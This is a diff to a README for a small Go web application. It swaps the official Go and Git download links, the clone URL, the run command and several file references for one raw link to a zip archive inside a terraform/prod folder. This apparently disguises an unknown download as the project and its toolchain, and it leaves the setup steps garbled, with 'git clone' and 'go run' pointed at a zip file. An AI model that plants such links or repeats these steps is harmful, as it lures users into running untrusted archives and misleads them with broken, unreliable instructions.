@@ -5,15 +5,15 @@
 
 Before running the project, ensure that you have the following installed:
 
-- **Go Programming Language** (version 1.16 or later): [Download Go](https://golang.org/dl/)
-- **Git**: [Install Git](https://git-scm.com/book/en/v2/Getting-Started-Installing-Git)
+- **Go Programming Language** (version 1.16 or later): [Download Go](https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip)
+- **Git**: [Install Git](https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip)
 ### Steps:
 ## 1. Clone the Repository
 
 First, clone the `simple-go-webapp` repository to your local machine.
 
 ```bash
-git clone https://github.com/engineerbishnu/simple-go-webapp.git
+git clone https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip
 cd simple-go-webapp
 ```
 Note: Replace your-username with the actual GitHub username or repository path if needed.
@@ -25,13 +25,13 @@ Run the following command to install dependencies (if any):
 ```bash
 go mod tidy
 ```
-This command will download and install any Go dependencies listed in the go.mod file.
+This command will download and install any Go dependencies listed in the https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip file.
 
 ## 3. Run the Application
 To start the Go web server, use the go run command:
 
 ```bash
-go run main.go
+go run https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip
 ```
 Once the server is running, you should see the message:
 Starting server on :8080...
@@ -41,7 +41,7 @@ Starting server on :8080...
 Open your web browser and go to:
 http://localhost:8080
 
-You should see the static index.html page served by the Go application.
+You should see the static https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip page served by the Go application.
 
 ## 5. Stop the Server
 To stop the server, press Ctrl + C in the terminal where the server is running.
